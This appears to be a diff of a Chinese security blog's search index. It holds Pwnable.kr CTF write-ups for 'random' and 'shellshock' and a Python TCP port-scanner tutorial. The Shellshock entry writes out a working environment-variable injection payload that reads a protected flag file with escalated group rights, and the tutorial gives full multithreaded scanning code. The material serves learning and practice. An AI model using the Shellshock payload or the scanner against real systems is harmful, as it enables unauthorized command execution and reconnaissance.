   <entry>
+    <title>random</title>
+    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/1.png" class></strong></p>
+ <a id="more"></a>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/2.png" class></strong></p>
+<h3 id="查看randomc源代码"><a class="markdownIt-Anchor" href="#查看randomc源代码"></a> 查看random.c源代码</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/3.png" class></strong></p>
+<p>函数的整个执行流程是rand（）产生的随机值和输入的密钥进行异或，若其结果等于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mi>x</mi><mi>d</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi>b</mi><mi>e</mi><mi>e</mi><mi>f</mi></mrow><annotation encoding="application/x-tex">0xdeadbeef</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span></span></span></span>，则可以执行system函数，拿到flag。</p>
+<h3 id="rand函数"><a class="markdownIt-Anchor" href="#rand函数"></a> rand（）函数</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/4.png" class></strong></p>
+<p>由此可见，如果不重新生成种子（一般情况下，默认生成种子为1），则每次产生的随机数将会是一个固定值，那么接下来的任务就是确定这个固定值。</p>
+<h3 id="查看随机数"><a class="markdownIt-Anchor" href="#查看随机数"></a> 查看随机数</h3>
+<h4 id="disassemble-r-main查看汇编代码"><a class="markdownIt-Anchor" href="#disassemble-r-main查看汇编代码"></a> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>e</mi><mi>m</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">/</mi><mi>r</mi><mtext> </mtext><mi>m</mi><mi>a</mi><mi>i</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">disassemble /r \ main</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span></span></span></span>查看汇编代码</h4>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/5.png" class></strong></p>
+<h4 id="在cmp处下断点"><a class="markdownIt-Anchor" href="#在cmp处下断点"></a> 在cmp处下断点</h4>
+<p>汇编代码中，在进行cmp之前先进行了一次异或运算，显然这是将用户输入的key和生成的随机数进行异或，由此可以判断随机数的位置为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>b</mi><mi>p</mi><mo>−</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">rbp-4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">b</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>（先压入栈中），因此使用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">/</mi><mn>10</mn><mi>x</mi><mtext> </mtext><mi mathvariant="normal">$</mi><mi>r</mi><mi>b</mi><mi>p</mi><mo>−</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">x/10x \ \$rbp-4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">x</span><span class="mord">/</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mspace"> </span><span class="mord">$</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">b</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>查看内存的值即可。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/6.png" class></strong></p>
+<p>所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。</p>
+<h3 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h3>
+<p>求出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mi>x</mi><mn>6</mn><mi>b</mi><mn>8</mn><mi>b</mi><mn>4567</mn><mo>⊕</mo><mn>0</mn><mi>x</mi><mi>d</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi>b</mi><mi>e</mi><mi>e</mi><mi>f</mi></mrow><annotation encoding="application/x-tex">0x6b8b4567\oplus 0xdeadbeef</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord">6</span><span class="mord mathdefault">b</span><span class="mord">8</span><span class="mord mathdefault">b</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span></span></span></span>的值输入即可</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/7.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shellshock</title>
+    <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/0.png" class></strong></p>
+ <a id="more"></a>
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/1.png" class></strong></p>
+<h3 id="查看shellshockc源文件"><a class="markdownIt-Anchor" href="#查看shellshockc源文件"></a> 查看shellshock.c源文件</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/2.png" class></strong></p>
+<p>程序依次运行三个函数*<a href="https://www.man7.org/linux/man-pages/man2/setresgid.2.html">setresuid、setresgid</a>、system*</p>
+<h3 id="查看程序的执行权限"><a class="markdownIt-Anchor" href="#查看程序的执行权限"></a> 查看程序的执行权限</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/3.png" class></strong></p>
+<p>以shellshock身份启动时，程序的权限是other权限r-x，而在setresuid和setresgid中使用的是effective gid，也就是shellshock_pwn的权限r-s，当程序执行到system时，程序已经具有shellshock_pwn组权限了。</p>
+<p><strong>这个组权限对于flag文件来说是可读的（r–）</strong>，但是问题在于这一段程序并没有涉及对flag的读操作，权限虽然有了，但怎么办呢？显然这里利用shellshock漏洞。可通过下面的命令证明确实存在shellshock漏洞：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; ./bash -c &quot;echo this is a test&quot;</span><br></pre></td></tr></table></figure>
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/4.png" class></strong></p>
+<p>实际上，“x=’() { :;}; echo vulnerable”​是new出来了一个新的环境变量：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">KEY=x</span><br><span class="line">VALUE=() &#123;:;&#125;; echo vulnerable</span><br></pre></td></tr></table></figure>
+<p>而当我们后续执行bash的时候，最终会定位到initialize_shell_variables中，这个函数内部会遍历所有的环境变量，而我们设计的VALUE绕过了其中一个export函数的定义检查，使得最终执行的是后面的echo vulnerable串。所以，调用bash的时候，自定义的这个语句就会触发。简而言之，这个漏洞会把用户输入的指令当作代码执行。</p>
+<p>于是，我们在这条语句的基础上将自定义语句换为bash -c “cat ./flag”，执行的程序bash -c换成./shellshock(它内部调用了bash -c ‘echo shock_me’)，因此当执行shellshock中的system函数会调用bash，总而自动执行cat flag这条命令，因为./shellshock执行时拿到了shellshock_pwn的权限，从而破壳漏洞可以在此权限上成功执行了cat ./flag，即成功实现了提权操作。</p>
+<h3 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h3>
+<p>运行下面语句拿到flag</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; bash -c &quot;cat ./flag&quot;&#x27; ./shellshock</span><br></pre></td></tr></table></figure>
+<p><strong></strong></p>
+<p>关于shellshock漏洞相关知识可参考：</p>
+<p>1、<a href="https://www.baidu.com/link?url=3yWq37n7Y_LHRUa2L-iudGGqqgT-6s4gKmaU0_hOQBDFSacVZ_bxZqpA999gplxb_gOwXfn9XSE9mE53bYkDBK&amp;wd=&amp;eqid=e40eff4200053949000000035aa32eda">关于<em>ShellShock</em>漏洞的利用过程和原理解析 - CSDN博客</a></p>
+<p>2、<a href="http://www.freebuf.com/articles/system/45390.html">破壳（ShellShock）漏洞样本分析报告</a></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>uaf</title>
     <url>/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/1.png" class></strong></p>
@@ -686,68 +556,210 @@ b） ptr 指向的堆内存可由用户控制</p>
       </tags>
   </entry>
   <entry>
-    <title>random</title>
-    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/1.png" class></strong></p>
+    <title>python实现端口扫描器</title>
+    <url>/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/0.png" class></strong></p>
  <a id="more"></a>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/2.png" class></strong></p>
-<h3 id="查看randomc源代码"><a class="markdownIt-Anchor" href="#查看randomc源代码"></a> 查看random.c源代码</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/3.png" class></strong></p>
-<p>函数的整个执行流程是rand（）产生的随机值和输入的密钥进行异或，若其结果等于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mi>x</mi><mi>d</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi>b</mi><mi>e</mi><mi>e</mi><mi>f</mi></mrow><annotation encoding="application/x-tex">0xdeadbeef</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span></span></span></span>，则可以执行system函数，拿到flag。</p>
-<h3 id="rand函数"><a class="markdownIt-Anchor" href="#rand函数"></a> rand（）函数</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/4.png" class></strong></p>
-<p>由此可见，如果不重新生成种子（一般情况下，默认生成种子为1），则每次产生的随机数将会是一个固定值，那么接下来的任务就是确定这个固定值。</p>
-<h3 id="查看随机数"><a class="markdownIt-Anchor" href="#查看随机数"></a> 查看随机数</h3>
-<h4 id="disassemble-r-main查看汇编代码"><a class="markdownIt-Anchor" href="#disassemble-r-main查看汇编代码"></a> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>e</mi><mi>m</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">/</mi><mi>r</mi><mtext> </mtext><mi>m</mi><mi>a</mi><mi>i</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">disassemble /r \ main</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span></span></span></span>查看汇编代码</h4>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/5.png" class></strong></p>
-<h4 id="在cmp处下断点"><a class="markdownIt-Anchor" href="#在cmp处下断点"></a> 在cmp处下断点</h4>
-<p>汇编代码中，在进行cmp之前先进行了一次异或运算，显然这是将用户输入的key和生成的随机数进行异或，由此可以判断随机数的位置为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>b</mi><mi>p</mi><mo>−</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">rbp-4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">b</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>（先压入栈中），因此使用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">/</mi><mn>10</mn><mi>x</mi><mtext> </mtext><mi mathvariant="normal">$</mi><mi>r</mi><mi>b</mi><mi>p</mi><mo>−</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">x/10x \ \$rbp-4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">x</span><span class="mord">/</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mspace"> </span><span class="mord">$</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">b</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>查看内存的值即可。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/6.png" class></strong></p>
-<p>所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。</p>
-<h3 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h3>
-<p>求出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mi>x</mi><mn>6</mn><mi>b</mi><mn>8</mn><mi>b</mi><mn>4567</mn><mo>⊕</mo><mn>0</mn><mi>x</mi><mi>d</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi>b</mi><mi>e</mi><mi>e</mi><mi>f</mi></mrow><annotation encoding="application/x-tex">0x6b8b4567\oplus 0xdeadbeef</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord">6</span><span class="mord mathdefault">b</span><span class="mord">8</span><span class="mord mathdefault">b</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span></span></span></span>的值输入即可</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/7.png" class></strong></p>
+<h3 id="实现原理"><a class="markdownIt-Anchor" href="#实现原理"></a> 实现原理</h3>
+<p>最简单的端口扫描工具使用TCP连接扫描的方式，即利用操作系统原生的网络功能，且通常作为SYN扫描的替代选项。Nmap将这种模式称为连接扫描，因为使用了类似Unix系统的connect()命令。如果该端口是开放的，操作系统就能完成TCP三次握手，然后端口扫描工具会立即关闭刚建立的连接，防止拒绝服务攻击。这种端口扫描模式的优势是用户无需特殊权限。但使用操作系统原生网络功能不能实现底层控制，因此这种扫描方式并不流行。并且TCP扫描很容易被发现，尤其作为端口清扫的手段：这些服务会记录发送者的 IP 地址，入侵检测系统可能触发警报。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><mo>−</mo><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">--&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>（<a href="https://xz.aliyun.com/t/5376#toc-0">端口扫描类型</a>）</p>
+<p>还有另外一种扫描方式是 SYN 扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送 IP 数据包，并监控其回应。这种扫描模式被称为 “半开放扫描”，因为它从不建立完整的 TCP 连接。端口扫描工具生成一个 SYN 包，如果目标端口开放，则会返回 SYN-ACK 包。扫描端回应一个 RST 包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回 RST 包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但 SYN 扫描的优势是从不会建立完整的连接。然而，RST 包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。</p>
+<p>实例中采用的是第一种扫描方式，直接利用操作系统的 socket 连接接口，初步测试目标服务器的端口是否可以连接，如果可以则返回端口打开状态。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><mo>−</mo><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">--&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>（<a href="https://gist.github.com/kevinkindom/108ffd675cb9253f8f71">socket编程基础</a>）</p>
+<h3 id="实现单线程扫描功能"><a class="markdownIt-Anchor" href="#实现单线程扫描功能"></a> 实现单线程扫描功能</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实现从程序外部向程序传递参数</span></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">portstrs = sys.argv[<span class="number">2</span>].split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描端口范围</span></span><br><span class="line">start_port = int(portstrs[<span class="number">0</span>])</span><br><span class="line">end_port = int(portstrs[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目标ip地址</span></span><br><span class="line">target_ip = gethostbyname(host)</span><br><span class="line">opened_ports = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行循环连接</span></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(start_port, end_port):</span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">10</span>)</span><br><span class="line">    result = sock.connect_ex((target_ip, port))</span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        opened_ports.append(port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印开放的端口</span></span><br><span class="line">print(<span class="string">&quot;Opened ports:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> opened_ports:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/2.png" class></strong></p>
+<p>上面代码实现了单线程扫描端口的测试，但是正常的程序在执行中我们需要考虑执行效率和提升性能，所以需要实现多线程程序。</p>
+<h3 id="多线程扫描"><a class="markdownIt-Anchor" href="#多线程扫描"></a> 多线程扫描</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> gevent.pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TCP_connect</span>(<span class="params">ip, port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;模拟TCP连接&quot;&quot;&quot;</span></span><br><span class="line">    TCP_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    TCP_sock.settimeout(<span class="number">0.5</span>)  <span class="comment"># 设置连接超时</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = TCP_sock.connect_ex((ip, int(port)))</span><br><span class="line">        <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;[*]%s 端口 开启\t&quot;</span> % port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(&quot;[!]%s端口 关闭&quot;%port)</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        TCP_sock.close()</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[!]错误:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_ip</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描目标IP&quot;&quot;&quot;</span></span><br><span class="line">    ip = input(<span class="string">&quot;[+]输入扫描目标IP:&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[*]正在扫描&quot;</span>)</span><br><span class="line">    scan_port(ip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_web</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描目标网址&quot;&quot;&quot;</span></span><br><span class="line">    web = input(<span class="string">&quot;[+]输入扫描网址:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;http://&quot;</span> <span class="keyword">in</span> web <span class="keyword">or</span> <span class="string">&quot;https://&quot;</span> <span class="keyword">in</span> web:</span><br><span class="line">        web = web[web.find(<span class="string">&#x27;://&#x27;</span>) + <span class="number">3</span>:]</span><br><span class="line">        print(web)</span><br><span class="line">        print(<span class="string">&quot;[*]正在分析网站服务器IP&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server_ip = socket.gethostbyname(str(web))</span><br><span class="line">        print(<span class="string">&quot;[*]服务器IP为%s&quot;</span> % server_ip)</span><br><span class="line">        scan_port(server_ip)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[!]服务器IP获取失败&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_port</span>(<span class="params">ip</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描端口&quot;&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*]开始扫描目标端口&quot;</span>)</span><br><span class="line">    start = time.time()</span><br><span class="line">    g = gevent.pool.Pool(<span class="number">50</span>)  <span class="comment"># 设置线程数</span></span><br><span class="line">    run_list = []</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">65535</span>):</span><br><span class="line">        run_list.append(g.spawn(TCP_connect, ip, port))</span><br><span class="line">    gevent.joinall(run_list)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;[*]总耗时%s&quot;</span> % time.strftime(<span class="string">&quot;%H:%M:%S&quot;</span>, time.gmtime(end - start)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&quot;1.通过IP扫描端口&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;2.通过网址扫描端口&quot;</span>)</span><br><span class="line">    uc = int(input(<span class="string">&quot;[+]请输入选择:&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> == uc:</span><br><span class="line">        scan_ip()</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">2</span> == uc:</span><br><span class="line">        scan_web()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[!]输入有误&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>这里展示部分运行结果：</p>
+<h4 id="选择通过网址扫描端口"><a class="markdownIt-Anchor" href="#选择通过网址扫描端口"></a> 选择通过网址扫描端口</h4>
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/3.png" class></strong></p>
+<h4 id="选择通过ip扫描端口"><a class="markdownIt-Anchor" href="#选择通过ip扫描端口"></a> 选择通过IP扫描端口</h4>
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/4.png" class></strong></p>
+<h3 id="使用nmap扫描"><a class="markdownIt-Anchor" href="#使用nmap扫描"></a> 使用nmap扫描</h3>
